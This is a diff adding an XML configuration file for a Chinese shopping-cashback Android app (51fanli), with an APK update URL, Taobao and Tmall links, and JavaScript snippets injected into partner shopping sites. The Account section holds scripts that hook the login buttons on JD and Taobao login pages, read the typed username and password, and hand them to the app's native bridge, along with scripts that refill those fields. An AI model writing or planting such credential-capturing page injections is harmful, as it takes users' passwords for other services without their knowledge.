@@ -1,0 +1,69 @@
+﻿
+<FLAndroid
+    alipayUrl="https://mapi.alipay.com/gateway.do"
+    checkUrlKV="http://wvs.m.taobao.com@@@@@http%3A%2F%2Fwvs.m.taobao.com%3Fpid%3Dmm_13127418_0_0%26backHiddenFlag%3D1"
+    dhmOn="1"
+    dhmTitle="如果您有兑换码,请点击这里"
+    dhmUrl="http://huodong.51fanli.com/Jfb131007H5/step1"
+    dhmsubTitle="兑换"
+    getFanliPointSwitch="true"
+    refreshInterval="1"
+    showPhoneFee="true"
+    suckByTaobao="false"
+    suckByTaobaoCart="false"
+    superBrowserUrl="http://m.51fanli.com/@@@@@@http://fun.51fanli.com/api/user/gourl"
+    taobaoCartRege="m.taobao.com/awp/base/cart.htm"
+    taobaoCartRegeNew="m.taobao.com/awp/base/cart.htm"
+    taobaoCartShow="true"
+    tbDownloadUrl="http://m.taobao.com/channel/act/sale/tbdl1.html"
+    tbappRege="Intent;scheme=(.*?);"
+    tbappScheme="taobao"
+    updateWords="1、颠覆式首页设计，打造最给力的返利导购 &lt;br/>2、新增“超级返利”频道，大牌正品10倍返利 
+&lt;br/>3、新增“今日值得买”频道，最专业的超值网购爆料&lt;br/>4、优化热门商城、淘宝返利，更多商家，更多精选&lt;br/>"
+    url="http://imagefile2.51fanli.net/app/android/FanliAndroid2600.apk"
+    version="2600"
+    versionCidFilter="1"
+    versionHelp="3"
+    versionHotword="8"
+    versionJs="1"
+    versionLoc="3"
+    versionMin="2413"
+    versionNewJs="1"
+    versionNewNewJs="2"
+    versionTaobaoRules="1"
+    withDrawHtml="false">
+
+	<Mall category="taobao.com">
+  		<js>function remove() {var ids = ['J_popupwrap','smartAd'];for(var i in ids) {try {var element = document.getElementById(ids[i]);element.parentNode.removeChild(element);if(sid){clearInterval(sid)}} catch(e) {}}} var sid = setInterval(remove, 1000); </js> 
+	</Mall>
+	<Mall category="tmall.com">
+  		<js>function remove() {var ids = ['J_popupwrap','smartAd'];for(var i in ids) {try {var element = document.getElementById(ids[i]);element.parentNode.removeChild(element);if(sid){clearInterval(sid)}} catch(e) {}}} var sid = setInterval(remove, 1000); </js> 
+	</Mall>
+	<Mall category="dangdang.com">
+  		<js>document.getElementById('client_adv_cover').style.display='none'; </js> 
+	</Mall>
+	
+	<Account category="^http\:passport\.jd\.com/new/login\.aspx" name="jd">
+  		<acGetJs>document.querySelector('#loginsubmit').addEventListener('click', function(){
+        var iframe = document.createElement('IFRAME');
+        var username = document.querySelector('#loginname').value;
+        var password = document.querySelector('#loginpwd').value;
+        window.getUserInfo.getJDWeb(username,password);
+        document.documentElement.appendChild(iframe);});
+        </acGetJs>
+  		<acSetJs>document.querySelector('#loginname').value = "%1$s";document.querySelector('#nloginpwd').value = "%2$s";</acSetJs>  
+	</Account>
+	<Account category="^http\://login\.m\.taobao\.com/login.htm" name="taobao">
+  		<acGetJs>document.querySelector('.c-btn-oran-big').addEventListener('click', function()
+{
+        var iframe = document.createElement('IFRAME');
+        var username = document.querySelector('#J_UserNameTxt').value;
+        var password = document.querySelector('#J_PassWordTxt').value;
+        window.getUserInfo.getTaobaoWap(username,password);
+        document.documentElement.appendChild(iframe);
+});</acGetJs>
+  		<acSetJs>document.querySelector('#J_UserNameTxt').value = "%1$s";document.querySelector('#J_PassWordTxt').value = "%2$s"; </acSetJs>  
+	</Account>
+	
+	
+</FLAndroid>
